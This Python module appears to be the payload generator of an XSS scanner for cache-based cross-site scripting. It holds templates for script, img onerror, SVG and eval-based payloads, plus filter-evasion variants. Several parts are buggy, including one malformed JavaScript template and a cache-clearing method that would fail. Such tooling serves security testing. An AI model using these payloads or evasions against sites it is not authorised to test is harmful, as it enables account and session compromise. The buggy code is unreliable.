"""
Enhanced XSS Payload Generator for CacheXSSDetector.
Generates sophisticated XSS payloads optimized for cache-based attacks with improved performance.
"""

from typing import List, Dict, Any, Optional, Set
import random
import base64
import html
import urllib.parse
import re
from dataclasses import dataclass
from functools import lru_cache
import hashlib
from ..utils.logger import get_logger

logger = get_logger(__name__)

@dataclass(frozen=True)
class PayloadTemplate:
    """Enhanced template for XSS payload generation."""
    name: str
    template: str
    description: str
    category: str
    encoding: Optional[str] = None
    context: Optional[str] = None
    priority: int = 1  # Higher number = higher priority
    requires_cache: bool = False
    complexity: int = 1  # 1-5 scale of payload complexity

    def __hash__(self):
        """Hash function for PayloadTemplate."""
        return hash((
            self.name,
            self.template,
            self.description,
            self.category,
            self.encoding,
            self.context,
            self.priority,
            self.requires_cache,
            self.complexity
        ))

    def __eq__(self, other):
        """Equality function for PayloadTemplate."""
        if not isinstance(other, PayloadTemplate):
            return NotImplemented
        return (
            self.name == other.name and
            self.template == other.template and
            self.description == other.description and
            self.category == other.category and
            self.encoding == other.encoding and
            self.context == other.context and
            self.priority == other.priority and
            self.requires_cache == other.requires_cache and
            self.complexity == other.complexity
        )

class PayloadGenerator:
    """
    Enhanced payload generator with improved cache awareness and performance.
    """

    def __init__(self, cache_size: int = 1000):
        """
        Initialize enhanced payload generator.
        
        Args:
            cache_size (int): Size of LRU cache for payload generation
        """
        self.templates = self._initialize_templates()
        self.encoding_functions = {
            'none': lambda x: x,
            'html': html.escape,
            'url': urllib.parse.quote,
            'double_url': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            'base64': lambda x: base64.b64encode(x.encode()).decode(),
            'unicode': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
            'hex': lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
            'decimal': lambda x: ''.join(f'&#x{ord(c):x};' for c in x)
        }
        
        # Initialize caches and patterns
        self._template_cache = {}
        self._variation_cache = {}
        self._cache_size = cache_size
        self.known_patterns: Set[str] = set()
        self.successful_patterns: Set[str] = set()

    def _get_from_cache(self, cache: Dict, key: str) -> Optional[Any]:
        """Get item from cache."""
        return cache.get(key)

    def _add_to_cache(self, cache: Dict, key: str, value: Any) -> None:
        """Add item to cache with LRU eviction."""
        if len(cache) >= self._cache_size:
            # Remove oldest entry
            oldest_key = next(iter(cache))
            del cache[oldest_key]
        cache[key] = value

    def _initialize_templates(self) -> List[PayloadTemplate]:
        """Initialize enhanced payload templates."""
        return [
            # High-Priority Basic Payloads
            PayloadTemplate(
                name="basic_alert",
                template='<script>alert("XSS")</script>',
                description="Basic XSS alert payload",
                category="basic",
                priority=3
            ),
            PayloadTemplate(
                name="img_onerror",
                template='<img src=x onerror=alert("XSS")>',
                description="Image onerror event payload",
                category="basic",
                priority=3
            ),
            
            # Advanced Cache-Specific Payloads
            PayloadTemplate(
                name="cache_time_based",
                template='<script>if(Date.now()%{time}==0)alert("XSS")</script>',
                description="Time-based cache XSS payload",
                category="cache_specific",
                requires_cache=True,
                priority=4
            ),
            PayloadTemplate(
                name="cache_etag_based",
                template='<script>fetch(location.href).then(r=>r.headers.get("etag")).then(e=>eval(atob(e)))</script>',
                description="ETag-based cache XSS payload",
                category="cache_specific",
                requires_cache=True,
                priority=4
            ),
            
            # DOM-based Payloads
            PayloadTemplate(
                name="dom_storage",
                template='<script>eval(localStorage.getItem("cache"))</script>',
                description="DOM storage based payload",
                category="dom",
                priority=3
            ),
            PayloadTemplate(
                name="dom_history",
                template='<script>eval(history.state.data)</script>',
                description="History API based payload",
                category="dom",
                priority=3
            ),
            
            # Advanced Attribute-based Payloads
            PayloadTemplate(
                name="attr_data",
                template='<div data-xss=""onmouseover=alert(1)//"">hover</div>',
                description="Data attribute payload",
                category="attribute",
                priority=2
            ),
            PayloadTemplate(
                name="attr_svg",
                template='<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
                description="SVG animation payload",
                category="attribute",
                priority=2
            ),
            
            # Sophisticated Encoded Payloads
            PayloadTemplate(
                name="encoded_mixed",
                template='&#x3C;script&#x3E;eval(atob("{base64}"))</script>',
                description="Mixed encoding payload",
                category="encoded",
                encoding="mixed",
                priority=3
            ),
            PayloadTemplate(
                name="encoded_unicode",
                template='\\u003Cscript\\u003Ealert("XSS")\\u003C/script\\u003E',
                description="Unicode encoded payload",
                category="encoded",
                encoding="unicode",
                priority=2
            ),
            
            # Context-Specific Payloads
            PayloadTemplate(
                name="js_template",
                template='${alert("XSS")}',
                description="JavaScript template literal payload",
                category="context_specific",
                context="javascript",
                priority=3
            ),
            PayloadTemplate(
                name="css_context",
                template='</style><script>alert("XSS")</script>',
                description="CSS context breakout payload",
                category="context_specific",
                context="style",
                priority=2
            ),
            
            # Cache-Timing Attack Payloads
            PayloadTemplate(
                name="cache_timing",
                template='<script>performance.mark("start");fetch(location.href).then(()=>{let t=performance.measure("",start").duration;if(t<100)alert("XSS")})</script>',
                description="Cache timing attack payload",
                category="cache_specific",
                requires_cache=True,
                priority=4,
                complexity=4
            )
        ]

    def generate(
        self,
        cache_info: Optional[Dict[str, Any]] = None,
        max_length: int = 1000,
        context: Optional[str] = None,
        encoding: Optional[str] = None,
        complexity: int = 3
    ) -> List[str]:
        """
        Generate optimized XSS payloads based on context and cache behavior.
        
        Args:
            cache_info (Optional[Dict[str, Any]]): Cache analysis information
            max_length (int): Maximum payload length
            context (Optional[str]): Context for payload generation
            encoding (Optional[str]): Encoding type to apply
            complexity (int): Maximum complexity level (1-5)
            
        Returns:
            List[str]: List of generated payloads
        """
        try:
            payloads = set()
            
            # Filter and sort templates
            suitable_templates = self._filter_templates(context, cache_info, complexity)
            
            # Generate base payloads
            for template in suitable_templates:
                cache_key = self._generate_cache_key(template, cache_info, max_length)
                if cached_payload := self._get_from_cache(self._template_cache, cache_key):
                    payloads.add(cached_payload)
                else:
                    if payload := self._generate_from_template(template, cache_info, max_length):
                        self._add_to_cache(self._template_cache, cache_key, payload)
                        payloads.add(payload)
            
            # Generate variations if needed
            if len(payloads) < 10:  # Only generate variations if we have few base payloads
                variations = set()
                for payload in payloads:
                    variation_key = f"{payload}:{encoding}:{max_length}"
                    if cached_variations := self._get_from_cache(self._variation_cache, variation_key):
                        variations.update(cached_variations)
                    else:
                        new_variations = self._generate_variations(payload, encoding, max_length)
                        self._add_to_cache(self._variation_cache, variation_key, new_variations)
                        variations.update(new_variations)
                payloads.update(variations)
            
            # Add successful patterns with high priority
            payloads.update(
                p for p in self.successful_patterns
                if len(p) <= max_length
            )
            
            # Filter and sort final payloads
            filtered_payloads = sorted(
                (p for p in payloads if len(p) <= max_length),
                key=lambda p: (
                    p in self.successful_patterns,  # Prioritize successful patterns
                    -len(p)  # Shorter payloads first
                ),
                reverse=True
            )
            
            logger.info(f"Generated {len(filtered_payloads)} payloads")
            return filtered_payloads[:50]  # Limit to top 50 payloads
            
        except Exception as e:
            logger.error(f"Error generating payloads: {str(e)}")
            return []

    def _generate_cache_key(
        self,
        template: PayloadTemplate,
        cache_info: Optional[Dict[str, Any]],
        max_length: int
    ) -> str:
        """Generate cache key for template generation."""
        components = [
            template.name,
            str(max_length)
        ]
        
        if cache_info:
            # Convert dictionary items to sorted tuples for consistent hashing
            cache_items = []
            for key in sorted(cache_info.keys()):
                value = cache_info[key]
                if isinstance(value, (list, dict, set)):
                    # Convert complex types to strings
                    value = str(sorted(value) if isinstance(value, (list, set)) else sorted(value.items()))
                cache_items.append(f"{key}:{value}")
            components.append(','.join(cache_items))
        else:
            components.append("no_cache")
            
        return hashlib.md5('|'.join(components).encode()).hexdigest()

    def _filter_templates(
        self,
        context: Optional[str],
        cache_info: Optional[Dict[str, Any]],
        max_complexity: int
    ) -> List[PayloadTemplate]:
        """Filter and sort templates based on context and cache behavior."""
        templates = []
        
        for template in self.templates:
            # Skip if template is too complex
            if template.complexity > max_complexity:
                continue
                
            # Skip if template requires cache but we don't have cache info
            if template.requires_cache and not cache_info:
                continue
                
            # Skip if context doesn't match
            if context and template.context and template.context != context:
                continue
                
            templates.append(template)
        
        # Sort by priority
        return sorted(templates, key=lambda t: t.priority, reverse=True)

    def _generate_from_template(
        self,
        template: PayloadTemplate,
        cache_info: Optional[Dict[str, Any]],
        max_length: int
    ) -> Optional[str]:
        """Generate payload from template with cache awareness."""
        try:
            payload = template.template
            
            # Replace dynamic components
            if '{time}' in payload:
                payload = payload.replace('{time}', str(random.randint(1000, 9999)))
            
            if '{base64}' in payload:
                inner_payload = 'alert("XSS")'
                payload = payload.replace(
                    '{base64}',
                    base64.b64encode(inner_payload.encode()).decode()
                )
            
            # Add cache-specific modifications if needed
            if template.requires_cache and cache_info:
                if 'etag' in cache_info:
                    payload = payload.replace(
                        'eval(atob(e))',
                        f'if(e=="{cache_info["etag"]}")alert("XSS")'
                    )
                if 'ttl' in cache_info:
                    payload = payload.replace(
                        'Date.now()',
                        f'Math.floor(Date.now()/{cache_info["ttl"]}000)'
                    )
            
            return payload if len(payload) <= max_length else None
            
        except Exception as e:
            logger.error(f"Error generating from template: {str(e)}")
            return None

    def _generate_variations(
        self,
        payload: str,
        encoding: Optional[str],
        max_length: int
    ) -> Set[str]:
        """Generate variations of a payload with caching."""
        variations = set()
        
        try:
            # Add basic variations
            variations.add(payload)
            
            # Apply requested encoding
            if encoding and encoding in self.encoding_functions:
                encoded = self.encoding_functions[encoding](payload)
                if len(encoded) <= max_length:
                    variations.add(encoded)
            
            # Add common evasion techniques
            evasions = [
                payload.replace('<', '\\x3c'),
                payload.replace('script', 'scr\\x69pt'),
                payload.replace('alert', 'al\\x65rt'),
                payload.replace('(', '\\x28').replace(')', '\\x29')
            ]
            
            variations.update(e for e in evasions if len(e) <= max_length)
            
            return variations
            
        except Exception as e:
            logger.error(f"Error generating variations: {str(e)}")
            return {payload}

    def add_successful_pattern(self, payload: str):
        """Add a successful payload pattern to improve future generations."""
        self.successful_patterns.add(payload)
        logger.info(f"Added successful pattern: {payload}")

    def clear_caches(self):
        """Clear all internal caches."""
        self._template_cache.cache_clear()
        self._variation_cache.cache_clear()
        logger.debug("Cleared payload generation caches")

if __name__ == "__main__":
    # Test payload generator functionality
    generator = PayloadGenerator()
    test_cache_info = {
        'ttl': 300,
        'vary_headers': ['User-Agent'],
        'etag': 'W/"123abc"'
    }
    
    test_payloads = generator.generate(
        cache_info=test_cache_info,
        context='html',
        complexity=4
    )
    
    print(f"Generated {len(test_payloads)} payloads:")
    for i, payload in enumerate(test_payloads, 1):
        print(f"{i}. {payload}")
